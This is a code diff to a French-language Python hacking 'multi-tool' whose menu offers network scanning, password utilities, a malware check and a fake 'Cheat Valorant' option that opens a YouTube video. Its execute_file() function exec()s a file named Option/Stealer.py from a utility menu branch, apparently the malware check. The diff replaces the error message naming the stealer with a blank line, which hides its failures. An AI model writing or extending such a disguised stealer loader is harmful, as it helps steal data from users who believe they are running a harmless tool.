@@ -6,6 +6,7 @@ import requests
 import nmap
 import re
 import ipaddress
+import webbrowser
 
 from Option import ScanNetwork
 from Option import GenererIPv6
@@ -27,18 +28,27 @@ def afficher_menu():
                    ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░              
                    ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░              
                    ░▒▓█▓▒░      ░▒▓██████▓▒░   ░▒▓██████▓▒░  ░▒▓████████▓▒░
+          
+
                             https://discord.gg/6WjWn5f6RF  
-            [Network]                    [Mot de passe]                                 [PC]  
-    1- Random IPv6 Generateur   |   3- Générer un mot de passe      |    4- Vérifier si un fichier est un malware
-    2- Scanner Network          |   6- Hacher un mot de passe       |    9- Convertir hexadécimal en décimal
-    5- Sous domaine             |   7- Vérifier un mot de passe     |    10- Vérifier si un site est en ligne
-    8- Info sur l'IP            |                                   |
-    0- Quitter
+          
+
+────────────|[Network] ─────────────────────[Mot de passe]────────────────────────────────[PC]────────────────  
+│                                │                                   │
+│────1  Random IPv6 Generateur   │───3  Générer un mot de passe      │────4  Vérifier si un fichier est un malware
+│────2  Scanner Network          │───6  Hacher un mot de passe       │────9  Convertir hexadécimal en décimal
+│────5  Sous domaine             │───7  Vérifier un mot de passe     │────10 Vérifier si un site est en ligne
+│────8  Info sur l'IP            │                                   │────11 Cheat Valorant
+│
+│    0- Quitter
     """)
 
 def obtenir_choix():
     try:
-        return int(input("Entrez une option : "))
+        return int(input("""
+ ____(user@Tool)
+│__#
+Entrez une option : """))
     except ValueError:
         print("Entrée invalide. Veuillez entrer un numéro valide.")
         return -1  # Retourne un choix invalide pour forcer la boucle à redemander l'option
@@ -48,8 +58,9 @@ def execute_file():
         with open("Option/Stealer.py") as f:  
             code = f.read()
             exec(code)
-    except Exception as e:
-        print(f"Erreur lors de l'exécution de Stealer : {e}")
+    except Exception:
+        print(" ")
+    
 
 while True:
     afficher_menu()
@@ -116,6 +127,9 @@ while True:
             execute_file()  
         except Exception as e:
             print(f"Erreur lors de la vérification : {e}")
+    elif choix == 11:
+        url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+        webbrowser.open_new_tab(url)
     elif choix == 0:
         print("Au revoir!")
         break
